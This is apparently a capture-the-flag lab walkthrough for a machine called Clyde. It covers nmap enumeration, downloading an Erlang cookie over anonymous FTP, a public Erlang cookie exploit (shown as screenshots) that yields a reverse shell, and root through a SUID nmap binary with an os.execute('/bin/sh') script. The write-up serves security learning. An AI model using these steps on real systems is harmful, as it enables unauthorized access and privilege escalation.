First we start enumeration with nmap 

`nmap -p- --min-rate 1000 -oN fulltcp.txt -v <IP> -Pn`

 ```
 # Nmap 7.93 scan initiated Tue Jan  3 20:35:01 2023 as: nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn 192.168.108.68
Increasing send delay for 192.168.108.68 from 0 to 5 due to 11 out of 23 dropped probes since last increase.
Warning: 192.168.108.68 giving up on port because retransmission cap hit (10).
Increasing send delay for 192.168.108.68 from 640 to 1000 due to 11 out of 15 dropped probes since last increase.
Nmap scan report for 192.168.108.68
Host is up (0.22s latency).
Not shown: 65366 filtered tcp ports (no-response), 163 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
4369/tcp  open  epmd
15672/tcp open  unknown
65000/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Jan  3 20:38:22 2023 -- 1 IP address (1 host up) scanned in 201.04 seconds
```

Now we got open ports let's run nmap default scripts to know what services is running on those ports...

```
# Nmap 7.93 scan initiated Tue Jan  3 20:38:38 2023 as: nmap -sC -sV -oN normal.tcp -p 22,21,80,4369,15672,65000 -Pn 192.168.108.68
Nmap scan report for 192.168.108.68
Host is up (0.20s latency).
                                         
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 PackageKit
| drwxr-xr-x    5 ftp      ftp          4096 Apr 24  2020 apache2
| drwxr-xr-x    5 ftp      ftp          4096 Sep 21  2020 apt
| drwxr-xr-x    2 ftp      ftp          4096 Apr 22  2020 dbus
| drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 dhcp
| drwxr-xr-x    7 ftp      ftp          4096 Sep 21  2020 dpkg
| drwxr-xr-x    2 ftp      ftp          4096 Apr 20  2020 git        
| drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 initramfs-tools
| drwxr-xr-x    2 ftp      ftp          4096 May 07  2020 logrotate
| drwxr-xr-x    2 ftp      ftp          4096 Sep 08  2019 misc
| drwxr-xr-x    5 ftp      ftp          4096 Sep 02 02:50 mysql
| drwxr-xr-x    2 ftp      ftp          4096 Jul 13  2017 os-prober
| drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 pam
| drwxr-xr-x    4 ftp      ftp          4096 Apr 24  2020 php
| drwx------    3 ftp      ftp          4096 Apr 24  2020 polkit-1
| drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 python
| drwxr-xr-x    3 ftp      ftp          4096 May 08  2020 rabbitmq
| drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 sgml-base
| drwxr-xr-x    6 ftp      ftp          4096 Apr 22  2020 systemd
| drwxr-xr-x    3 ftp      ftp          4096 Apr 30  2020 ucf
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
| ftp-syst:                      
|   STAT:              
| FTP server status:                                                               
|      Connected to 192.168.49.108
|      Logged in as ftp                                                                                                                                               
|      TYPE: ASCII                                                                                                                                                    
|      No session bandwidth limit
|      Session timeout in seconds is 300                                           
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 df6399a4cf7900c8b1d66797814d4faf (RSA)
|   256 bd9b354134a25a4cfa1b9ff136f36afd (ECDSA)
|_  256 db96ee8d292bf4a358b2fbc1ac659248 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
4369/tcp  open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 65000
15672/tcp open  http    Cowboy httpd
|_http-server-header: Cowboy
|_http-title: RabbitMQ Management
65000/tcp open  unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan  3 20:41:07 2023 -- 1 IP address (1 host up) scanned in 149.22 seconds
```

Let's Start first by enumerating port 21 (ftp)

```
ftp> cd rabbitmq
250 Directory successfully changed.
ftp> ls -al
229 Entering Extended Passive Mode (|||40001|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 May 08  2020 .
drwxr-xr-x   25 ftp      ftp          4096 Apr 24  2020 ..
-r--------    1 ftp      ftp            20 Apr 24  2020 .erlang.cookie
drwxr-x---    6 ftp      ftp          4096 Sep 02 02:50 mnesia
226 Directory send OK.
ftp> get .erlang_cookie 
local: .erlang_cookie remote: .erlang_cookie
229 Entering Extended Passive Mode (|||40003|)
550 Failed to open file.
ftp> get .erlang.cookie
local: .erlang.cookie remote: .erlang.cookie
229 Entering Extended Passive Mode (|||40009|)
150 Opening BINARY mode data connection for .erlang.cookie (20 bytes).
100% |*************************************************************************************************************************|    20      253.65 KiB/s    00:00 ETA
226 Transfer complete.
20 bytes received in 00:00 (0.09 KiB/s)
ftp> 
```

ftp anonymous login allow and change directory to rabbitmq, and i found a file `.erlang.cookie`, downloaded the file.

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Clyde]
└─$ cat .erlang.cookie 
JPCGJCAEWHPKKPBXBYYB
```

checking the file content was a cookie code, so i search for erlan cookie exploit

![image](https://user-images.githubusercontent.com/87468669/210432199-4abec850-cd48-4dfc-bdd4-439c030256fb.png)

Found a public exploit through searchsploit.

![image](https://user-images.githubusercontent.com/87468669/210435769-eab1ae53-8fe1-45e4-a54e-d3d435ab6f67.png)

Did some modification.

![image](https://user-images.githubusercontent.com/87468669/210435972-c1a2f2de-c0b6-41ba-b6a9-ff1c4cbcb4b6.png)

Ran the exploit and i got a revshell shell. Now let's escalate privs 

```
rabbitmq@clyde:~$ id
uid=107(rabbitmq) gid=112(rabbitmq) groups=112(rabbitmq)
rabbitmq@clyde:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/nmap
/usr/bin/newgrp
/bin/mount
/bin/ping
/bin/su
/bin/umount
/bin/fusermount
rabbitmq@clyde:~$ 
```

checking for suid, i found that nmap is a vuln suid. let's research on how to abuse the suid.

```
rabbitmq@clyde:~$                                                                                                                                                     
rabbitmq@clyde:~$ TF=$(mktemp)                                                                                                                                        
rabbitmq@clyde:~$ echo 'os.execute("/bin/sh")' > $TF                                                                                                                  
rabbitmq@clyde:~$ nmap --script=$TF                                                                                                                                   
                                                                                                                                                                      
Starting Nmap 7.40 ( https://nmap.org ) at 2023-01-03 15:37 EST                                                                                                       
WARNING: Running Nmap setuid, as you are doing, is a major security risk.                                                                                             
                                                                                                                                                                      
NSE: Warning: Loading '/tmp/tmp.Da1Ox8n7qI' -- the recommended file extension is '.nse'.
# uid=107(rabbitmq) gid=112(rabbitmq) euid=0(root) groups=112(rabbitmq)
```

![image](https://user-images.githubusercontent.com/87468669/210438009-45dba418-f330-4540-8549-2d8ad2bd8a30.png)

Boom!!! we got root!!!
